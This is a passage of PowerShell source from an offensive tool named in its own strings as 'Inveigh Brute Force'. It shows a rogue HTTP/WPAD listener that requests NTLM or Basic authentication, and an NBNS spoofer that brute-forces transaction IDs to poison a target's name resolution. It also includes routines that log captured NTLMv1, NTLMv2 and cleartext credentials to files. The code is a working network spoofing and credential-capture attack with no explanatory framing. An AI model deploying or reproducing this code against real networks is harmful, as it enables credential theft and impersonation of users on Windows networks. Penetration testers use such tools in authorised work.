        if(($HTTPAuth -eq 'NTLM' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -eq 'NTLM' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$NTLM_auth)
        { 
            $NTLM = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
            $HTTP_message_bytes = 0x0d,0x0a
            $HTTP_content_length_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message.Length)
            $HTTP_message_bytes += [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)

            $HTTP_response = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                             $HTTP_response_status_code +
                             0x20 +
                             $HTTP_response_phrase +
                             0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,
                             0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,
                             0x0a,0x44,0x61,0x74,0x65,0x3a +
                             $HTTP_timestamp +
                             0x0d,0x0a +
                             $HTTP_WWW_authenticate_header +
                             $NTLM +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,
                             0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,
                             0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
                             0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 +
                             $HTTP_content_length_bytes +
                             0x0d,0x0a +
                             $HTTP_message_bytes

        }
        elseif(($HTTPAuth -eq 'Basic' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -eq 'Basic' -and $HTTP_request_raw_URL -match '/wpad.dat'))
        {
            $Basic = [System.Text.Encoding]::UTF8.GetBytes("Basic realm=$HTTPBasicRealm")
            $HTTP_message_bytes = 0x0d,0x0a
            $HTTP_content_length_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message.Length)
            $HTTP_message_bytes += [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)
            $HTTP_client_close = $true

            $HTTP_response = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                             $HTTP_response_status_code +
                             0x20 +
                             $HTTP_response_phrase +
                             0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,
                             0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,
                             0x0a,0x44,0x61,0x74,0x65,0x3a +
                             $HTTP_timestamp +
                             0x0d,0x0a +
                             $HTTP_WWW_authenticate_header +
                             $Basic +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,
                             0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,
                             0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
                             0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 +
                             $HTTP_content_length_bytes +
                             0x0d,0x0a +
                             $HTTP_message_bytes

        }
        else
        {
            $HTTP_response_status_code = 0x32,0x30,0x30
            $HTTP_response_phrase = 0x4f,0x4b
            $HTTP_message_bytes = 0x0d,0x0a
            $HTTP_content_length_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message.Length)
            $HTTP_message_bytes += [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)
            $HTTP_client_close = $true

            $HTTP_response = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                             $HTTP_response_status_code +
                             0x20 +
                             $HTTP_response_phrase +
                             0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,
                             0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,
                             0x0a,0x44,0x61,0x74,0x65,0x3a +
                             $HTTP_timestamp +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,
                             0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,
                             0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,
                             0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 +
                             $HTTP_content_length_bytes +
                             0x0d,0x0a +
                             $HTTP_message_bytes 
        }

        $HTTP_stream.Write($HTTP_response,0,$HTTP_response.Length)
        $HTTP_stream.Flush()
        Start-Sleep -m 10
        $HTTP_request_raw_URL_old = $HTTP_request_raw_URL
        $HTTP_client_handle_old = $inveigh.HTTP_client.Client.Handle

        if($HTTP_client_close)
        {
            $inveigh.HTTP_client.Close()

            if($RunCount -gt 0 -and ($inveigh.NTLMv1_list.Count -ge $run_count_NTLMv1 -or $inveigh.NTLMv2_list.Count -ge $run_count_NTLMv2 -or $inveigh.cleartext_list.Count -ge $run_count_cleartext))
            {
                HTTPListenerStop
                $inveigh.console_queue.Add("Inveigh Brute Force exited due to run count at $(Get-Date -format 's')")
                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Brute Force exited due to run count")])
                $inveigh.bruteforce_running = $false
            }

        }

        $HTTP_client_close = $false
    }

}

$spoofer_scriptblock = 
{
    param ($SpooferIP,$Hostname,$SpooferTarget,$NBNSPause,$NBNSTTL)
   
    $Hostname = $Hostname.ToUpper()

    $hostname_bytes = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                      0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00

    $hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($Hostname)
    $hostname_encoded = [System.BitConverter]::ToString($hostname_encoded)
    $hostname_encoded = $hostname_encoded.Replace("-","")
    $hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($hostname_encoded)
    $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
    [Array]::Reverse($NBNS_TTL_bytes)

    for($i=0; $i -lt $hostname_encoded.Count; $i++)
    {

        if($hostname_encoded[$i] -gt 64)
        {
            $hostname_bytes[$i] = $hostname_encoded[$i] + 10
        }
        else
        {
            $hostname_bytes[$i] = $hostname_encoded[$i] + 17
        }
    
    }

    $NBNS_response_packet = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                            $hostname_bytes +
                            0x00,0x20,0x00,0x01 +
                            $NBNS_TTL_bytes +
                            0x00,0x06,0x00,0x00 +
                            ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
                            0x00,0x00,0x00,0x00

    $inveigh.console_queue.Add("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $Hostname on $SpooferTarget")
    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $Hostname on $SpooferTarget")])
    $NBNS_paused = $false          
    $send_socket = New-Object System.Net.Sockets.UdpClient(137)
    $destination_IP = [System.Net.IPAddress]::Parse($SpooferTarget)
    $destination_point = New-Object Net.IPEndpoint($destination_IP,137)
    $send_socket.Connect($destination_point)
       
    while($inveigh.bruteforce_running)
    {

        :NBNS_spoofer_loop while (!$inveigh.hostname_spoof -and $inveigh.bruteforce_running)
        {

            if($NBNS_paused)
            {
                $inveigh.console_queue.Add("$(Get-Date -format 's') - Resuming NBNS brute force spoofer")
                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Resuming NBNS brute force spoofer")])
                $NBNS_paused = $false
            }

            for ($i = 0; $i -lt 255; $i++)
            {

                for ($j = 0; $j -lt 255; $j++)
                {
                    $NBNS_response_packet[0] = $i
                    $NBNS_response_packet[1] = $j                 
                    $send_socket.send( $NBNS_response_packet,$NBNS_response_packet.Length)

                    if($inveigh.hostname_spoof -and $NBNSPause)
                    {
                        $inveigh.console_queue.Add("$(Get-Date -format 's') - Pausing NBNS brute force spoofer")
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Pausing NBNS brute force spoofer")])
                        $NBNS_paused = $true
                        break NBNS_spoofer_loop
                    }
                
                }
            
            }
        
        }

        Start-Sleep -m 5
    }

    $send_socket.Close()
 }

$control_bruteforce_scriptblock = 
{
    param ($NBNSPause,$RunTime)

    if($RunTime)
    {    
        $control_timeout = new-timespan -Minutes $RunTime
        $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }

    if($NBNSPause)
    {   
        $NBNS_pause = new-timespan -Seconds $NBNSPause
    }
       
    while ($inveigh.bruteforce_running)
    {

        if($RunTime)
        {
            
            if($control_stopwatch.Elapsed -ge $control_timeout)
            {

                if($inveigh.HTTP_listener.IsListening)
                {
                    $inveigh.HTTP_listener.Stop()
                    $inveigh.HTTP_listener.Close()
                }
            
                if($inveigh.bruteforce_running)
                {
                    HTTPListenerStop
                    $inveigh.console_queue.Add("Inveigh Brute Force exited due to run time at $(Get-Date -format 's')")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Brute Force exited due to run time")])
                    Start-Sleep -m 5
                    $inveigh.bruteforce_running = $false
                }
            
                if($inveigh.relay_running)
                {
                    $inveigh.console_queue.Add("Inveigh Relay exited due to run time at $(Get-Date -format 's')")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Relay exited due to run time")])
                    Start-Sleep -m 5
                    $inveigh.relay_running = $false
                } 

                if($inveigh.running)
                {
                    $inveigh.console_queue.Add("Inveigh exited due to run time at $(Get-Date -format 's')")
                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh exited due to run time")])
                    Start-Sleep -m 5
                    $inveigh.running = $false
                } 
            
            }
        }

        if($NBNSPause -and $inveigh.hostname_spoof)
        {
         
            if($inveigh.NBNS_stopwatch.Elapsed -ge $NBNS_pause)
            {
                $inveigh.hostname_spoof = $false
            }
        
        }

        if($inveigh.file_output -and !$inveigh.running)
        {

            while($inveigh.log_file_queue.Count -gt 0)
            {
                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
                $inveigh.log_file_queue.RemoveRange(0,1)
            }

            while($inveigh.NTLMv1_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
                $inveigh.NTLMv1_file_queue.RemoveRange(0,1)
            }

            while($inveigh.NTLMv2_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
                $inveigh.NTLMv2_file_queue.RemoveRange(0,1)
            }

            while($inveigh.cleartext_file_queue.Count -gt 0)
            {
                $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append
                $inveigh.cleartext_file_queue.RemoveRange(0,1)
            }
        
        }

        Start-Sleep -m 5
    }
 }

# End ScriptBlocks
# Begin Startup functions

# HTTP Listener Startup function 
function HTTPListener()
{

    if($HTTPIP)
    {
        $HTTPIP = [System.Net.IPAddress]::Parse($HTTPIP)
        $inveigh.HTTP_endpoint = New-Object System.Net.IPEndPoint($HTTPIP,$HTTPPort)
    }
    else
    {
        $inveigh.HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::any,$HTTPPort)
    }

    $inveigh.HTTP_listener = New-Object System.Net.Sockets.TcpListener $inveigh.HTTP_endpoint
    $inveigh.HTTP_listener.Start()
    $HTTP_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTP_powershell = [PowerShell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument($HTTPResponse).AddArgument(
        $NBNSPause).AddArgument($WPADAuth).AddArgument($WPADIP).AddArgument($WPADPort).AddArgument(
        $WPADDirectHosts).AddArgument($WPADResponse).AddArgument($RunCount) > $null
    $HTTP_powershell.BeginInvoke() > $null
}

# Spoofer Startup function
function Spoofer()
{
    $spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $spoofer_runspace.Open()
    $spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $spoofer_powershell = [PowerShell]::Create()
    $spoofer_powershell.Runspace = $spoofer_runspace
    $spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $spoofer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $spoofer_powershell.AddScript($spoofer_scriptblock).AddArgument($SpooferIP).AddArgument($Hostname).AddArgument(
        $SpooferTarget).AddArgument($NBNSPause).AddArgument($NBNSTTL) > $null
    $spoofer_powershell.BeginInvoke() > $null
}

# Control Brute Force Startup function
function ControlBruteForceLoop()
{
    $control_bruteforce_runspace = [RunspaceFactory]::CreateRunspace()
    $control_bruteforce_runspace.Open()
    $control_bruteforce_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $control_bruteforce_powershell = [PowerShell]::Create()
    $control_bruteforce_powershell.Runspace = $control_bruteforce_runspace
    $control_bruteforce_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $control_bruteforce_powershell.AddScript($control_bruteforce_scriptblock).AddArgument($NBNSPause).AddArgument($RunTime) > $null
    $control_bruteforce_powershell.BeginInvoke() > $null
}

# End Startup functions

# Startup Enabled Services

# HTTP Server Start
if($HTTP -eq 'Y')
{
    HTTPListener
}

# Spoofer Start
if($NBNS -eq 'Y')
{
    Spoofer
}

# Control Brute Force Loop Start
if($NBNSPause -or $RunTime -or $inveigh.file_output)
{
    ControlBruteForceLoop
}

if($inveigh.console_output)
{

    :console_loop while(($inveigh.bruteforce_running -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
    {

        while($inveigh.console_queue.Count -gt 0)
        {

            if($inveigh.output_stream_only)
            {
                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                $inveigh.console_queue.RemoveRange(0,1)
            }
            else
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    "Inveigh *exited *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }

                    "* written to *"
                    {

                        if($inveigh.file_output)
                        {
                            Write-Warning $inveigh.console_queue[0]
                        }

                        $inveigh.console_queue.RemoveRange(0,1)
                    }

                    "* for relay *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }

                    "*SMB relay *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }

                    "* local administrator *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }

                    default
                    {
                        Write-Output $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveRange(0,1)
                    }

                }

            }

        }

        if($inveigh.console_input)
        {

            if([Console]::KeyAvailable)
            {
                $inveigh.console_output = $false
                BREAK console_loop
            }
        
        }

        Start-Sleep -m 5
    }

}

if($inveigh.file_output -and !$inveigh.running)
{

    while($inveigh.log_file_queue.Count -gt 0)
    {
        $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
        $inveigh.log_file_queue.RemoveRange(0,1)
    }

    while($inveigh.NTLMv1_file_queue.Count -gt 0)
    {
        $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
        $inveigh.NTLMv1_file_queue.RemoveRange(0,1)
    }

    while($inveigh.NTLMv2_file_queue.Count -gt 0)
    {
        $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
        $inveigh.NTLMv2_file_queue.RemoveRange(0,1)
    }

    while($inveigh.cleartext_file_queue.Count -gt 0)
    {
        $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append
        $inveigh.cleartext_file_queue.RemoveRange(0,1)
    }

}

}
